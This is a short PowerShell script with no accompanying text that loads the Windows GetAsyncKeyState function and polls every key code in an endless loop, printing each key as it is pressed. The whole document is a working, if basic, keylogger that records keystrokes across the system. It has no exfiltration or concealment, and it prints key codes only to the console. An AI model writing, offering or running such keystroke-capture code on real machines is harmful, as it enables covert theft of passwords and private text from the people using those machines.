Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

while ($true) {
    Start-Sleep -Milliseconds 100
    for ($i = 1; $i -lt 256; $i++) {
        $state = [Win32]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            Write-Output $i
        }
    }
}

